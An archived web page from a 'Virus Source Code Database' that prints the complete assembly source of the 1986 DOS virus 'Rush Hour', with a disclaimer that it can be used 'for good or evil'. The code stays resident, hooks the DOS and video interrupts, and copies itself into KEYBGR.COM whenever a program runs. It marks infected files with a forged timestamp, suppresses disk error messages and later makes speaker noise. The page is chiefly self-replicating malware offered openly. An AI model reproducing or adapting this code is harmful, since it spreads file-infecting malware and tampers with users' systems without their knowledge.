<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: rushhour_asm</title>
<meta name="KEYWORDS" content="rushhour.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for rushhour.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="rage_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rage_asm.php">rage_asm</a><br>
<a href="rammonst_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rammonst_asm.php">rammonst_asm</a><br>
<a href="rand_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rand_asm.php">rand_asm</a><br>
<a href="ranger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/ranger_asm.php">ranger_asm</a><br>
<a href="rapbetr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rapbetr_asm.php">rapbetr_asm</a><br>
<a href="rape1882_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rape1882_asm.php">rape1882_asm</a><br>
<a href="rapeiib_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rapeiib_asm.php">rapeiib_asm</a><br>
<a href="rape_v20_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rape_v20_asm.php">rape_v20_asm</a><br>
<a href="rausr757_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rausr757_asm.php">rausr757_asm</a><br>
<a href="ravage_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/ravage_asm.php">ravage_asm</a><br>
<a href="raver_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/raver_asm.php">raver_asm</a><br>
<a href="raygun2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/raygun2_asm.php">raygun2_asm</a><br>
<a href="raygun_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/raygun_asm.php">raygun_asm</a><br>
<a href="readvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/readvir_asm.php">readvir_asm</a><br>
<a href="rec_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rec_asm.php">rec_asm</a><br>
<a href="red_merc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/red_merc_asm.php">red_merc_asm</a><br>
<a href="redmerc_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/redmerc_asm.php">redmerc_asm</a><br>
<a href="redx_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/redx_asm.php">redx_asm</a><br>
<a href="replic_d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/replic_d_asm.php">replic_d_asm</a><br>
<a href="republic_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/republic_asm.php">republic_asm</a><br>
<a href="retal1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/retal1_asm.php">retal1_asm</a><br>
<a href="retal2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/retal2_asm.php">retal2_asm</a><br>
<a href="retal3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/retal3_asm.php">retal3_asm</a><br>
<a href="retal4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/retal4_asm.php">retal4_asm</a><br>
<a href="reyes_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/reyes_asm.php">reyes_asm</a><br>
<a href="richard__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/richard__asm.php">richard__asm</a><br>
<a href="richards_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/richards_asm.php">richards_asm</a><br>
<a href="riot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/riot_asm.php">riot_asm</a><br>
<a href="rip_hd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rip_hd_asm.php">rip_hd_asm</a><br>
<a href="ritzen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/ritzen_asm.php">ritzen_asm</a><br>
<a href="riverbot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/riverbot_asm.php">riverbot_asm</a><br>
<a href="rizwi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rizwi_asm.php">rizwi_asm</a><br>
<a href="rna_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rna_pas.php">rna_pas</a><br>
<a href="rnd__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rnd__asm.php">rnd__asm</a><br>
<a href="rnd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rnd_asm.php">rnd_asm</a><br>
<a href="rnd_num_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rnd_num_asm.php">rnd_num_asm</a><br>
<a href="romulan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/romulan_asm.php">romulan_asm</a><br>
<a href="roseanne_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/roseanne_asm.php">roseanne_asm</a><br>
<a href="roz_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/roz_asm.php">roz_asm</a><br>
<a href="rtl4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rtl4_asm.php">rtl4_asm</a><br>
<a href="runt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/runt_asm.php">runt_asm</a><br>
<a href="runt_b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/runt_b_asm.php">runt_b_asm</a><br>
<a href="runt-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/runt-b_asm.php">runt-b_asm</a><br>
<a href="rush_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rush_asm.php">rush_asm</a><br>
<a href="rushhour_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rushhour_asm.php">rushhour_asm</a><br>
<a href="rushhr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rushhr_asm.php">rushhr_asm</a><br>
<a href="rush_vir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/rush_vir_asm.php">rush_vir_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

	PAGE 72,132
	TITLE Virus "RUSH HOUR" V1.0 (p) Foxi, 1986
	NAME VIRUS

ABS0		SEGMENT	AT 0
		ORG	4*10h
VIDEO_INT	DW	2 DUP (?)	; Video Interrupt

		ORG	4*21h
DOS_INT 	DW	2 DUP (?)	; DOS Interrupt

		ORG	4*24h
ERROR_INT	DW	2 DUP (?)	; ERROR Interrupt
ABS0		ENDS

code	SEGMENT
	assume	cs:code, ds:code, es:code

	ORG 05Ch
FCB	LABEL BYTE
DRIVE	DB	?
FSPEC	DB	11 DUP (' ')	; Filename
	ORG	6Ch
FSIZE	DW	2 DUP (?)
FDATE	DW	?		; date of last modifcation

FTIME	DW	?		; time of last mod
	ORG	80h
	DTA	DW 128 DUP (?)	; Disk Transfer Area (DTA)
	ORG	071Eh		; END OF THE NORMAL KEYBGR.COM

	xor ax, ax
	mov es, ax		; ES points to ABS0
	assume es:ABS0

	push cs
	pop ds

	mov ax, VIDEO_INT	 	; store old interrupt vectors
	mov bx, VIDEO_INT+2
	mov word ptr VIDEO_VECTOR, ax
	mov word ptr VIDEO_VECTOR+2, bx
	mov ax, DOS_INT
	mov bx, DOS_INT+2
	mov word ptr DOS_VECTOR, ax
	mov word ptr DOS_VECTOR+2, bx
	cli
	mov DOS_INT, OFFSET VIRUS	; new DOS vector points to VIRUS

	mov DOS_INT+2, cs
	mov VIDEO_INT, OFFSET DISEASE	; video vector points to DISEASE
	mov VIDEO_INT+2, cs
	sti

	mov ah, 0		; Get system time
	int 1Ah 		; read TimeOfDay (TOD)
	mov TIME_0, dx		; CX:DX = number of clock ticks since midnight

	lea dx, VIRUS_ENDE
	int 27h 		; terminate program & remain resident (TSR)

VIDEO_VECTOR	DD	(?)
DOS_VECTOR	DD	(?)
ERROR_VECTOR	DW	2 DUP (?)
TIME_0		DW	?

;
; VIRUS main program
;
; 1. System call AH=4BH?
;    No: --> 2
;    Yes: Test for KEYBGR.COM on specified drive
;	  Already infected?
;	  Yes :--> 3.
;	  No  : Infection!
;
; 2. Jump to normal DOS

RNDVAL	DB	'bfhg'
ACTIVE	DB	0		; not active
PRESET	DB	0		; first virus not active

	DB	'A:'
FNAME	DB	'KEYBGR  COM'
	DB	0

VIRUS	PROC	FAR
	assume cs:code, ds:nothing, es:nothing

	push ax
	push cx
	push dx

	mov ah, 0		; check if at least 15 minutes
	int 1ah 		; have elapsed since installation.

	sub dx, TIME_0
	cmp dx, 16384		; 16384 ticks on the clock=15 minutes
	jl $3
	mov ACTIVE, 1		; if so, activate virus

  $3:	pop dx
	pop cx
	pop ax

	; disk access because of the DOS command
	; "Load & execute program" ?
	cmp ax, 4B00h
	je $1

EXIT_1:
	jmp DOS_VECTOR		; No: --> continue as normal

  $1:	push es 		; ES:BX --> parameter block
	push bx 		; DS:DX --> filename
	push ds 		; save registers which will be needed
	push dx 		; for INT 21H (AH=4Bh)

	mov DI, dx
	mov DRIVE, 0		; set the drive of the program
	mov al, ds:[DI+1]	; to be executed
	cmp al, ':'
	jne $5

	mov al, ds:[DI]
	sub al, 'A'-1
	mov DRIVE, al

  $5:	cld
	push cs
	pop ds
	xor ax, ax
	mov es, ax
	assume ds:code, es:ABS0

	mov ax, ERROR_INT	; ignore all disk "errors"
	mov bx, ERROR_INT+2	; with our own error routine
	mov ERROR_VECTOR, ax
	mov ERROR_VECTOR+2, bx
	mov ERROR_INT, OFFSET ERROR
	mov ERROR_INT+2, cs

	push cs
	pop es
	assume es:code

	lea dx, DTA		; DS:DX -> Disk Transfer Area (DTA)
	mov ah, 1Ah		; SET DISK TRANSFER AREA ADDRESS
	int 21h
	mov bx, 11		; transfer the filename

  $2:
	mov al, fname-1[bx]	; into File Control Block (FCB)
	mov FSPEC-1[bx], al
	DEC bx
	JNZ $2

	lea dx, FCB		; open file (for writing)
	mov ah, 0FH
	int 21H

	cmp al, 0
	jne EXIT_0		; file does not exist --> end

	mov BYTE PTR FCB + 20h, 0
	mov ax, FTIME		; file already infected?
	cmp ax, 4800h
	je EXIT_0		; YES --> END

	mov PRESET, 1		; (All copies are virulent !)
	mov SI, 100H		; write the virus in the file

   $4:
	lea DI, DTA
	mov cx, 128
	REP MOVSB
	lea dx, FCB 		; DS:DX -> opened FCB
	mov ah, 15h 		; SEQUENTIAL WRITE TO FCB FILE
	int 21h

	cmp SI, OFFSET VIRUS_ENDE
	jl $4

	mov FSIZE, OFFSET VIRUS_ENDE - 100H
	mov FSIZE+2, 0		; set correct file size
	mov FDATE, 0AA3h	; set correct date (3-5-86)
	mov FTIME, 4800h	; set time (09:00:00)

	lea dx, FCB		; close file
	mov ah, 10h
	int 21h

	xor ax, ax
	mov es, ax
	assume es:ABS0

	mov ax, ERROR_VECTOR	; reset the error interrupt
	mov bx, ERROR_VECTOR+2
	mov ERROR_INT, ax
	mov ERROR_INT+2, bx

   EXIT_0:
	pop dx			; restore the saved registers
	pop ds
	pop bx
	pop es
	assume ds:nothing, es:nothing

	mov ax, 4B00h		; "EXEC" - LOAD AND EXECUTE PROGRAM
	jmp DOS_VECTOR		; normal function execution

VIRUS	ENDP

ERROR	PROC FAR
	IRET			; simply ignore all errors...

ERROR	ENDP

DISEASE	PROC FAR
	assume ds:nothing, es:nothing
	push ax 	   	; Save registers
	push cx

	test PRESET, 1
	jz EXIT_2

	test ACTIVE, 1
	jz EXIT_2

	IN	al, 61h 	; Enable speak (Bit 0 := 0)
	AND	al, 0feh
	OUT	61h, al

	mov cx, 3      		; index loop cx
 NOISE:				; generate Noise
	mov al, RNDVAL
	xor al, RNDVAL + 3
	SHL al, 1
	SHL al, 1
	RCL WORD PTR RNDVAL, 1
	RCL WORD PTR RNDVAL+2, 1

	mov ah, RNDVAL		; output some bit
	and ah, 2		; of the feedback
	IN al, 61h		; shift register
	and al, 0FDh		; --> noise from speaker
	OR al, ah
	OUT 61H, al

	LOOP NOISE

	and al, 0FCh		; turn speaker off
	OR al,1
	OUT 61H, al

 EXIT_2:
	pop cx
	pop ax
	jmp VIDEO_VECTOR	; jump to normal VIDEO routine ...

DISEASE ENDP

	DB 'This program is a VIRUS program.'
	DB 'Once activated it has control over all'
	DB 'system devices and even over all storage'
	DB 'media inserted by the user.  It continually'
	DB 'copies itself into uninfected operating'
	DB 'systems and thus spreads uncontrolled.'

	DB 'The fact that the virus does not destroy any'
	DB 'user programs or erase the disk is merely due'
	DB 'to a philanthropic trait of the author......'

	ORG 1C2Ah

VIRUS_ENDE	LABEL BYTE

code	ends

	end

</textarea></td></tr></table></body></html>
